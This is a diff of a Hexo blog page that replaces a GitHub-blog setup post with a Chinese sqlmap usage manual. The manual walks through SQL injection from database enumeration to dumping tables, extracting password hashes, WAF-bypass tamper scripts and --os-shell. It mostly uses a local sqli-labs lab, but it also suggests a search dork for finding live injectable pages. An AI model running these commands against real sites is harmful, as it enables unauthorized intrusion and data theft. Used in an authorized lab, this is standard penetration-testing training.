@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="用github+hexo搭建一个属于自己的博客, xiaoming的博客">
+    <meta name="keywords" content="sqlmap使用手册, xiaoming的博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>用github+hexo搭建一个属于自己的博客 | xiaoming的博客</title>
+    <title>sqlmap使用手册 | xiaoming的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">用github+hexo搭建一个属于自己的博客</h1>
+                    <h1 class="description center-align post-title">sqlmap使用手册</h1>
                 </div>
             </div>
         </div>
@@ -444,7 +444,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-10-15
+                    2021-03-20
                 </div>
                 
 
@@ -460,47 +460,64 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>一直想搭建一个自己的博客，但是一直不知道怎么搞，在看别人文章是偶然发现了别人的博客，心想自己也搭建一个吧，于是有了这篇文章 (●’◡’●)。<br>本篇文章参考 <a target="_blank" rel="noopener" href="https://422926799.github.io/posts/5358472d.html">https://422926799.github.io/posts/5358472d.html</a></p>
-<p>我的环境:   <strong>win10</strong></p>
-<h1 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h1><hr>
-<p>首先需要一个Github账号</p>
-<p>Github官网：<a target="_blank" rel="noopener" href="https://github.com/">https://github.com</a></p>
-<p>注册好之后，去新建一个项目。项目名称为你的username.github.io  我也不知道为什么必须要这样，可能害怕有重名的问题吧。</p>
-<p>然后需要的环境是git，nodejs，hexo，npm</p>
-<ol>
-<li>git安装直接官网下载你系统版本 <a target="_blank" rel="noopener" href="https://git-scm.com/download/win">https://git-scm.com/download/win</a></li>
-<li>Linux下安装： sudo apt-get install git</li>
-<li>windows安装nodejs：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hackyo/p/8110951.html">https://www.cnblogs.com/hackyo/p/8110951.html</a> //安装nodejs教程和npm教程</li>
-<li>Linux下安装nodejs：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u014361775/article/details/78865582">https://blog.csdn.net/u014361775/article/details/78865582</a> </li>
-<li>安装hexo: 打开命令行输入 npm i -g hexo 如果没反应等情况,可以看看本篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_38802323/article/details/102586628?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">https://blog.csdn.net/weixin_38802323/article/details/102586628?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param</a></li>
-<li>查看hexo是否安装成功:hexo -v </li>
-<li>这时我们创建一个文件夹 例如：blog_hexo 我们命令行切换进去</li>
-<li>输入hexo init进行初始化，成功后blog_hexo中会出现许多文件(<strong>注意hexo命令最好在blog_hexo文件夹中输入</strong>)</li>
-<li>接下来我们就可以通过命令来搭建本地的博客 hexo generate</li>
-<li>hexo server //启动服务<br>打开浏览器访问命令行中的地址就可以看到我们的博客了</li>
-</ol>
-<p>如果想要更换主题可以去官网下载，我这里用的是<a target="_blank" rel="noopener" href="https://github.com/blinkfox/hexo-theme-matery">https://github.com/blinkfox/hexo-theme-matery</a> </p>
-<p>我们打开git Bash 并切换目录到themes里 输入：git clone <a target="_blank" rel="noopener" href="https://github.com/blinkfox/hexo-theme-matery.git">https://github.com/blinkfox/hexo-theme-matery.git</a><br>下载喜欢的主题。</p>
-<p>下载成功后将文件夹的名字复制，打开根目录下的_config.yml文件，用notepad或其他编辑器打开，找到theme 将内容修改为我们复制的内容，然后输入命令：</p>
-<p>hexo clean</p>
-<p>hexo generate</p>
-<p>hexo server</p>
-<p>打开命令行中的网站就可以查看我们修改过的博客。</p>
-<p>做好这些后我们需要将我们的博客迁移到github上让更多人看见，就像我现在这样 (●’◡’●)</p>
-<p>安装deploy：npm install hexo-deployer-git –save</p>
-<p>我们修改根目录 _config.yml 找到deploy:<br>使下面的内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type: git </span><br><span class="line"></span><br><span class="line">repo: https:&#x2F;&#x2F;github.com&#x2F;你的username&#x2F;你的username.github.io</span><br><span class="line"></span><br><span class="line">branch: master</span><br></pre></td></tr></table></figure>
-<p>还差最后一步！！</p>
-<p>弄好之后我们执行hexo d -g </p>
-<p>浏览器访问：https://你的username.github.io/  如果找不到，我们可以找到我们github上面的项目 点击settings一直往下拉，找到GitHub Pages  </p>
-<p><code>Your site is published at https://daveqqq.github.io/ </code></p>
-<p>这个链接就是你的博客地址哦~</p>
-<p>接下来我们开始写文章<br>hexo new “filename”<br>输入命令后在 <em>source/_post</em> 中就会出现我们的文件是以md后缀结尾的文件。<br>我们需要用Markdown来编写我们的页面。</p>
-<p>我这里使用的vscode来编写的具体的配置过程 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/56943330">https://zhuanlan.zhihu.com/p/56943330</a> </p>
-<p>还有对于我们主题的配置修改请移步你所下主题的具体配置文件，这里就不多说了。</p>
-<p>好了就这样吧！本博客会不定期更新欢迎大家来玩啊！！！</p>
-<p><img src="./pic/pika.jpg"></p>
-<p>转载请注明：来自daveqqq.github.io</p>
+                <p>比较全的参数</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/studyone/p/5426303.html">https://www.cnblogs.com/studyone/p/5426303.html</a><br>mysql-h 192.168.222.131 -u root  -p<br>链接数据库</p>
+<p>可以找到进行练手<br>百度语法：<br>可以找到url中包含 php?id= 的页面<br>inurl:php?id=<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12407946/1610155965801-50a05d50-7362-437f-a643-ddfe0a29a143.png#align=left&display=inline&height=656&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=656&originWidth=1240&size=166922&status=done&style=none&width=1240" alt="图片.png"></p>
+<h4 id="最基础用法"><a href="#最基础用法" class="headerlink" title="最基础用法"></a>最基础用法</h4><p><code>python sqlmap.py -u url</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12407946/1610156427695-4d545b33-68b6-4dec-9bd6-b674e1e5462b.png#align=left&display=inline&height=602&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=602&originWidth=1237&size=80328&status=done&style=none&width=1237" alt="图片.png"><br><code>python sqlmap.py -v</code> -v参数 0-6（default）越大越详细</p>
+<h4 id="从文本文件中解析目标"><a href="#从文本文件中解析目标" class="headerlink" title="从文本文件中解析目标"></a>从文本文件中解析目标</h4><p>参数：-m<br>参数“-u”一次只能指定一个URL，若有多个URL需要测试就显得很不方便，我们可用将多个URL以一行一个的格式保存在文本文件中，然后使用参数“-m”，后跟该文本文件路径，让Sqlmap依次读取文件中的URL作为攻击目标。<br>如我们有文件url.txt，内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www.target1.com&#x2F;vuln1.php?q&#x3D;foobar</span><br><span class="line">  www.target2.com&#x2F;vuln2.asp?id&#x3D;1</span><br><span class="line">  www.target3.com&#x2F;vuln3&#x2F;id&#x2F;1*• 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后可用使用如下命令让Sqlmap测试这些URL是否存在注入漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -m url.txt</span><br></pre></td></tr></table></figure>
+<p>同样,执行该命令时，Sqlmap会很贴心地一个个询问：“do you want to test this URL?”</p>
+<h4 id="从文件载入HTTP请求"><a href="#从文件载入HTTP请求" class="headerlink" title="从文件载入HTTP请求"></a>从文件载入HTTP请求</h4><p>参数：-r<br>可以将一个HTTP请求保存在文件中，然后使用参数“-r”加载该文件，Sqlmap会解析该文件，从该文件分析目标并进行测试。<br>设有如下所示的HTTP请求保存在文件get.txt中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;user.php?id&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">  Host: 192.168.56.101:8080</span><br><span class="line">  User-Agent: Mozilla&#x2F;5.0 (X11; Ubuntu; Linux x86_64; rv:55.0) Gecko&#x2F;20100101 Firefox&#x2F;55.0</span><br><span class="line">  Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">  Accept-Language: zh-SG,en-US;q&#x3D;0.7,en;q&#x3D;0.3</span><br><span class="line">  Accept-Encoding: gzip, deflate</span><br><span class="line">  DNT: 1</span><br><span class="line">  Connection: close</span><br><span class="line">  Upgrade-Insecure-Requests: 1• 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>则使用如下命令让Sqlmap解析该文件，以该文件中HTTP请求目标为攻击目标进行测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r get.txt</span><br></pre></td></tr></table></figure>
+<h4 id="POST数据"><a href="#POST数据" class="headerlink" title="POST数据"></a>POST数据</h4><p>参数：–-data<br>该参数指定的数据会被作为POST数据提交，Sqlmap也会检测该参数指定数据是否存在注入漏洞。如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.56.102:8080&#x2F;user.php&quot; --data&#x3D;&quot;id&#x3D;0&amp;name&#x3D;werner&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="使用tamper"><a href="#使用tamper" class="headerlink" title="使用tamper"></a>使用tamper</h4><p>sqlmap下的tamper目录存放绕过WAF脚本<br>使用方法 –tamper 脚本名称，脚本名称<br>多个tamper脚本之间用空格隔开<br>各个tamper的介绍</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dyw_666666/article/details/83420362">https://blog.csdn.net/dyw_666666/article/details/83420362</a></p>
+<h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><p>参数：–cookie、–cookie-del、–drop-set-cookie和–load-cookies<br>有两种情况会用到这些参数：</p>
+<ul>
+<li>要测试的页面只有在登录状态下才能访问，登录状态用cookie识别</li>
+<li>想要检测是否存在cookie注入</li>
+</ul>
+<p>当“–level”设置为2或更高时，Sqlmap会检测cookie是否存在注入漏洞，关于“–level”的更多信息见下文。<br>(1).“–cookie”和“–cookie-del”<br>在浏览器中登录目标网站后复制出维持登录状态的cookie，用参数“–cookie”来指定这些cookie，如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;192.168.56.102:8080&#x2F;user.php&quot; --cookie &quot;JSESSIONID&#x3D;E5D6C8C81;NAME&#x3D;werner;&quot;</span><br></pre></td></tr></table></figure>
+<p>与POST参数不同，cookie默认的分隔符为“;”，想要指定cookie中的分隔符，使用参数“–cookie-del”。<br>(2).“–drop-set-cookie”<br>若HTTP响应头中有“Set-Cookie”，Sqlmap会自动设置“Set-Cookie”设置的cookie，并对这些cookie进行检测。若不想让Sqlmap这么做，添加参数“–drop-set-cookie”即可，这样，Sqlmap会忽略“Set-Cookie”。<br>(3).“–load-cookies”<br>该参数用于从文件中载入Netscape或wget格式的cookie。<br>wget可以保存和载入cookie，示例如下：</p>
+<h4 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h4><p>参数：–user-agent和–random-agent<br>默认情况下Sqlmap发送的HTTP请求中的User-Agent值为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap&#x2F;1.0-dev-xxxxxxx (http:&#x2F;&#x2F;sqlmap.org)</span><br></pre></td></tr></table></figure>
+<p>使用参数“–user-agent”可以指定一个User-Agent值。但正常的User-Agent值长什么样我们可能并不记得，所以有了参数“–random-agent”，使用该参数，Sqlmap会从文件./txt/user-agents.txt中随机地取一个User-Agent。注意，在一次会话中只有使用同一个User-Agent，并不是每发一个HTTP请求包，都随机一个User-Agent。</p>
+<h4 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h4><p>参数：–timeout<br>超时时间默认为30秒，可以用参数“–timeout”指定超时时间，如“–timeout 44.5”表示设置超时时间为44.5秒。</p>
+<h4 id="绕过CSRF保护"><a href="#绕过CSRF保护" class="headerlink" title="绕过CSRF保护"></a>绕过CSRF保护</h4><p>参数：–csrf-token和–csrf-url<br>现在有很多网站通过在表单中添加值为随机生成的token的隐藏字段来防止CSRF攻击，Sqlmap会自动识别出这种保护方式并绕过。但自动识别有可能失效，此时就要用到这两个参数。<br>“–csrf-token”用于指定包含token的隐藏字段名，若这个字段名不是常见的防止CSRF攻击的字段名Sqlmap可能不能自动识别出，需要手动指定。如Django中该字段名为“csrfmiddlewaretoken”，明显与CSRF攻击有关。<br>“–csrf-url”用于从任意的URL中回收token值。若最初有漏洞的目标URL中没有包含token值而又要求在其他地址提取token值时该参数就很有用。<br>sqlmap 中有这样两个参数<br><code>–csrf-token=”token_name”</code>，指定随机化token的参数名<br><code>–csrf-url=”</code><a target="_blank" rel="noopener" href="http://x.x.x.x/page"><code>http://x.x.x.x/page</code></a><code>”</code>，指定获取token值的地址<br>如果没有指定–csrf-url，则默认从当前页面获取token。先来看看不指定token时，sqlmap的输出：<br><code>sqlmap -u &quot;http://192.168.154.134/tokensql.php?name=admin&amp;token=123&quot; --flush-session</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12407946/1610157661973-b4fef125-4b12-4d53-b29d-34e960ac882e.png#align=left&display=inline&height=368&margin=%5Bobject%20Object%5D&originHeight=368&originWidth=720&size=0&status=done&style=none&width=720"></p>
+<p>再看看 …..</p>
+<h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><h4 id="1-检测级别"><a href="#1-检测级别" class="headerlink" title="1.检测级别"></a>1.检测级别</h4><p>参数：–level<br>此参数用于指定检测级别，有1~5共5级。默认为1，表示做最少的检测，相应的，5级表示做最多的检测。<br> Sqlmap使用的payload保存在目录xml/payloads/中，是xml格式的，可以自己定制。节选一个payload如下所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;test&gt;</span><br><span class="line">      &lt;title&gt;AND boolean-based blind - WHERE or HAVING clause (Generic comment)&lt;&#x2F;title&gt;</span><br><span class="line">      &lt;stype&gt;1&lt;&#x2F;stype&gt;</span><br><span class="line">      &lt;level&gt;2&lt;&#x2F;level&gt;</span><br><span class="line">      &lt;risk&gt;1&lt;&#x2F;risk&gt;</span><br><span class="line">      &lt;clause&gt;1&lt;&#x2F;clause&gt;</span><br><span class="line">      &lt;where&gt;1&lt;&#x2F;where&gt;</span><br><span class="line">      &lt;vector&gt;AND [INFERENCE]&lt;&#x2F;vector&gt;</span><br><span class="line">      &lt;request&gt;</span><br><span class="line">          &lt;payload&gt;AND [RANDNUM]&#x3D;[RANDNUM]&lt;&#x2F;payload&gt;</span><br><span class="line">          &lt;comment&gt;[GENERIC_SQL_COMMENT]&lt;&#x2F;comment&gt;</span><br><span class="line">      &lt;&#x2F;request&gt;</span><br><span class="line">      &lt;response&gt;</span><br><span class="line">          &lt;comparison&gt;AND [RANDNUM]&#x3D;[RANDNUM1]&lt;&#x2F;comparison&gt;</span><br><span class="line">      &lt;&#x2F;response&gt;</span><br><span class="line">  &lt;&#x2F;test&gt;• 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在上例中可以看到有level标签，其值为2，该payload在检测级别大于等于2时被使用。<br> risk标签的含义见后文。<br>检测级别不仅会影响payload的使用，还会影响注入点的检测，GET和POST参数是一直会被检测的，<br> 检测级别大于等于2时会检测cookie是否有注入，检测级别大于等于3时会检测User-Agent和Referer是否有注入。<br>若不是很清楚注入点在哪里可以设置一个比较高的检测级别。<br>强烈建议在向Sqlmap官方报告一个明确存在的注入漏洞检测不出来前先把检测级别调高试试。</p>
+<h4 id="2-风险等级"><a href="#2-风险等级" class="headerlink" title="2.风险等级"></a>2.风险等级</h4><p>参数：–risk<br>此参数用于指定风险等级，有1~4共4级。默认风险等级为1，此等级在大多数情况下对测试目标无害。<br> 风险等级2添加了基于时间的注入测试，等级3添加了OR测试。<br>若注入点是在UPDATE语句中，使用OR测试可能会修改整个表的数据，这显然不是攻击者想要看到的。<br> 因此用户需要能控制风险等级避开有潜在风险的payload。</p>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">以下命令顺序即为sql注入常见步骤。</span><br><span class="line">sqlmap -u url --dbs #获取数据库</span><br><span class="line">sqlmap -u url --current-user #获取当前用户名称 ：</span><br><span class="line">sqlmap -u url --current-db #获取当前数据库名称</span><br><span class="line">sqlmap -u url -D 数据库名 --tables   #列出表名 ： </span><br><span class="line">sqlmap -u url -D 数据库名 -T 表名 --columns #列出字段 </span><br><span class="line">sqlmap -u url -D 数据库名 -T 表名 -C 字段名1,字段名2,…… --dump #获取字段内容</span><br></pre></td></tr></table></figure>
+<p>提示：<br>1、如果是Microsoft Access 可省略前三个步骤 且不需要-D参数<br>2、获取字段内容时可以省略字段信息直接查询所有字段 使用：<br>sqlmap -u url -D 数据库名 -T 表名 –dump</p>
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="常见参数及解释"><a href="#常见参数及解释" class="headerlink" title="常见参数及解释"></a><strong>常见参数及解释</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">--cookie&#x3D;cookie的内容        设置cookie 值 通常配合获取数据库使用 </span><br><span class="line">--data        设置 POST 提交的值</span><br><span class="line">-u        指定目标 URL</span><br><span class="line">-b        获取 DBMS banner</span><br><span class="line">--current-db        获取当前数据库</span><br><span class="line">--current-user        获取当前数据库的用户</span><br><span class="line">--tables        获取数据库里所有的表名</span><br><span class="line">--columns        获取表里的所有字段</span><br><span class="line">--dump        获取字段中的内容</span><br><span class="line">--current-user        获取当前用户</span><br><span class="line">-D [数据库名]       指定数据库名</span><br><span class="line">-T  [表名]      指定表名</span><br><span class="line">-C  [字段名]      指定字段名</span><br><span class="line">--string       当查询可用时用来匹配页面中的字符串</span><br><span class="line">--users        枚举所有用户</span><br><span class="line">--passwords      枚举所有用户的密码hsah</span><br><span class="line">--dbs      枚举数据库中的数据库名</span><br><span class="line">-r       指定请求包</span><br><span class="line">GET型注入一般用 sqlmap -u url</span><br><span class="line">POST型注入一般用 sqlmap -u url --data POST参数</span><br><span class="line">如果需要增加cookie或其他请求头 可将请求保存到文本中，如request.txt，则用sqlmap -r request.txt（经常配合burpsuite使用，直接将请求包保存到文件，然后使用sqlmap -r 来进行sql注入）</span><br></pre></td></tr></table></figure>
+<p>**<br><strong>基础参数</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--level 5  探测等级(1~5 默认为1，等级越高Payload越多，速度也比较慢)</span><br><span class="line">--is-dba   判断当前用户是否是管理员权限</span><br><span class="line">--roles    列出数据库管理员角色(仅适用与Oracle数据库)</span><br><span class="line">--referer  HTTP Referer头(伪造HTTP头中的Referer，当--level等级大于等于3时会通过伪造Referer来进行注入)</span><br><span class="line">--sql-shell 运行自定义SQL语句 用法：sqlmap -u url --sql-shell</span><br><span class="line">--flush-session 清除以前的记录</span><br><span class="line">--os-cmd，--os-shell 运行任意操作系统命令(仅支持MySQL、PostgreSQL、SQL Server)</span><br><span class="line">--file-read 从数据库服务器中读取文件(要知道文件绝对路径)</span><br><span class="line">--file-write &quot;本地文件路径&quot; --file-dest &quot;远程绝对路径&quot;   上传文件到数据库服务器中</span><br><span class="line">--tamper &quot;模块名&quot; bypass绕waf时使用 具体模块可参考书《Web安全攻防 渗透测试实战指南》P40~49页</span><br></pre></td></tr></table></figure>
+<h4 id="导航式测试"><a href="#导航式测试" class="headerlink" title="导航式测试"></a><strong>导航式测试</strong></h4><p><code>sqlmap --wizard</code>可以自动化进行流程测试<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12407946/1610164121400-2681ec82-d898-45f2-988a-3e67175840df.png#align=left&display=inline&height=798&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=798&originWidth=1263&size=265524&status=done&style=none&width=1263" alt="图片.png"></p>
+<h4 id="绕waf混淆参数"><a href="#绕waf混淆参数" class="headerlink" title="绕waf混淆参数"></a>绕waf混淆参数</h4><p><code>python sqlmap.py -u </code><a target="_blank" rel="noopener" href="http://192.168.222.131/sqli-labs-master/Less-1/?id=1"><code>http://192.168.222.131/sqli-labs-master/Less-1/?id=1 --tamper randomcase.py</code></a><br>通过 –tamper 加载脚本对id参数进行混淆<br>还有几个混淆脚本，使用多个用逗号相连</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tamper&#x2F;between.py,tamper&#x2F;randomcase.py,tamper&#x2F;space2comment.py</span><br></pre></td></tr></table></figure>
+<p>tamper/between.py 和 between.py写法都可以<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12407946/1610194535987-a270f50e-2c25-4eb3-9517-f7a70fac9938.png#align=left&display=inline&height=96&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=96&originWidth=786&size=10955&status=done&style=none&width=786" alt="图片.png"></p>
+<h4 id="星号的用法"><a href="#星号的用法" class="headerlink" title="星号的用法"></a>星号的用法</h4><p><code>sqlmap.py -u http://abc.com/index.php?id=2*&amp;ip=2</code><br>给需要测试的参数后加*,这样就只测试id这个参数</p>
+<h4 id="测试强度："><a href="#测试强度：" class="headerlink" title="测试强度："></a>测试强度：</h4><p><code>sqlmap.py -u [http://abc.com/index.php?id=2 --level 3](http://abc.com/index.php?id=2*&amp;ip=2)</code><br>默认是1，常用是** 3**</p>
+<h4 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h4><p><code>1.python sqlmap.py -u http://192.168.222.131/sqli-labs-master/Less-1/?id=1 --privileges </code> 查看用户的权限<br><code>2.python sqlmap.py -u http://192.168.222.131/sqli-labs-master/Less-1/?id=1 --is_dba</code>  #查看是否为管理员</p>
+<h4 id="高权限操作："><a href="#高权限操作：" class="headerlink" title="高权限操作："></a>高权限操作：</h4><p>爆出用户密码：<br><code>python sqlmap.py -u [http://192.168.222.131/sqli-labs-master/Less-1/?id=1](http://192.168.222.131/sqli-labs-master/Less-1/?id=1) -passwords</code><br>运行os-shell:<br><code>python sqlmap.py -u [http://192.168.222.131/sqli-labs-master/Less-1/?id=1](http://192.168.222.131/sqli-labs-master/Less-1/?id=1) --os-shell</code>‘<br>其实是上传了一个木马。</p>
+<h4 id="修改请求头信息"><a href="#修改请求头信息" class="headerlink" title="修改请求头信息"></a>修改请求头信息</h4><p><code>--random-agent</code> 采用随机agent<br><code>--user-agent=</code>  指定agent<br><code>--referer=</code> 指定来源</p>
+<h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><h4 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h4><p><code>python sqlmap.py -u [http://192.168.222.131/sqli-labs-master/Less-1/?id=1](http://192.168.222.131/sqli-labs-master/Less-1/?id=1) -dbs</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12407946/1610162674996-34094e9d-a7a0-4d70-97b3-bf5cd6186d89.png#align=left&display=inline&height=647&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=647&originWidth=1239&size=61603&status=done&style=none&width=1239" alt="图片.png"></p>
+<h4 id="当前用户"><a href="#当前用户" class="headerlink" title="当前用户"></a>当前用户</h4><p><code>python sqlmap.py -u </code><a target="_blank" rel="noopener" href="http://192.168.222.131/sqli-labs-master/Less-1/?id=1"><code>http://192.168.222.131/sqli-labs-master/Less-1/?id=1</code></a><code> -current-user</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12407946/1610162813088-e18d200b-4a58-4a98-a9ea-3c4c91488ec5.png#align=left&display=inline&height=525&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=525&originWidth=1233&size=62108&status=done&style=none&width=1233" alt="图片.png"></p>
+<h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><p><code>python sqlmap.py -u </code><a target="_blank" rel="noopener" href="http://192.168.222.131/sqli-labs-master/Less-1/?id=1"><code>http://192.168.222.131/sqli-labs-master/Less-1/?id=1</code></a><code> -D security --tables</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12407946/1610162922158-4fa7c483-db31-4e33-90c6-7291782e315a.png#align=left&display=inline&height=560&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=560&originWidth=1185&size=45549&status=done&style=none&width=1185" alt="图片.png"></p>
+<h4 id="爆出字段名"><a href="#爆出字段名" class="headerlink" title="爆出字段名"></a>爆出字段名</h4><p><code>python sqlmap.py -u </code><a target="_blank" rel="noopener" href="http://192.168.222.131/sqli-labs-master/Less-1/?id=1"><code>http://192.168.222.131/sqli-labs-master/Less-1/?id=1</code></a><code> -D security -T users --columns</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12407946/1610163386898-31b8611a-8e82-44d4-90b5-6c683d7f8334.png#align=left&display=inline&height=602&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=602&originWidth=1239&size=57863&status=done&style=none&width=1239" alt="图片.png"></p>
+<h4 id="爆出字段值"><a href="#爆出字段值" class="headerlink" title="爆出字段值"></a>爆出字段值</h4><p><code>python sqlmap.py -u </code><a target="_blank" rel="noopener" href="http://192.168.222.131/sqli-labs-master/Less-1/?id=1"><code>http://192.168.222.131/sqli-labs-master/Less-1/?id=1</code></a><code> -D security -T users -C id,password,username --dump</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12407946/1610163564872-063abae2-9cdf-4213-8336-4356f1b9a78c.png#align=left&display=inline&height=499&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=499&originWidth=1091&size=27747&status=done&style=none&width=1091" alt="图片.png"></p>
+<h4 id="-2"><a href="#-2" class="headerlink" title=""></a></h4><h4 id="使用burp抓取数据包"><a href="#使用burp抓取数据包" class="headerlink" title="使用burp抓取数据包"></a>使用burp抓取数据包</h4><p>利用burp拦数据包保存到文件中</p>
